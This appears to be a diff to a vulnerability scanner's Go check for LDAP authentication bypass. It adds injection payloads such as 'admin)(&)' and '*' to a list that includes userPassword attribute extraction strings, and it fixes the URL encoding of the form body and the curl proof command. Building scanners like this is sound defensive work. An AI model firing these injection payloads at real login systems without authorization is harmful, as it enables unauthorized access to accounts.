@@ -27,6 +27,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -980,9 +981,11 @@ func checkLDAPAuthBypass(ctx context.Context, client *http.Client, asset, base s
 		username string
 		label    string
 	}{
+		{"*", "wildcard match all"},
 		{"*)(uid=*))(|(uid=*", "wildcard uid filter"},
 		{"admin)(|(objectclass=*", "objectclass wildcard bypass"},
 		{"*)(userPassword=*", "userPassword attribute extraction"},
+		{"admin)(&)", "always-true AND bypass"},
 	}
 
 	// loginFormat defines how to encode login credentials for a POST request.
@@ -1008,10 +1011,13 @@ func checkLDAPAuthBypass(ctx context.Context, client *http.Client, asset, base s
 	formFormat := loginFormat{
 		contentType: "application/x-www-form-urlencoded",
 		encode: func(userField, passField, username, password string) []byte {
-			return []byte(fmt.Sprintf("%s=%s&%s=%s", userField, username, passField, password))
+			vals := url.Values{}
+			vals.Set(userField, username)
+			vals.Set(passField, password)
+			return []byte(vals.Encode())
 		},
 		proofCmd: func(target, userField, passField, username string) string {
-			return fmt.Sprintf(`curl -s -X POST '%s' -d '%s=%s&%s=test'`,
+			return fmt.Sprintf(`curl -s -X POST '%s' --data-urlencode '%s=%s' -d '%s=test'`,
 				target, userField, username, passField)
 		},
 	}
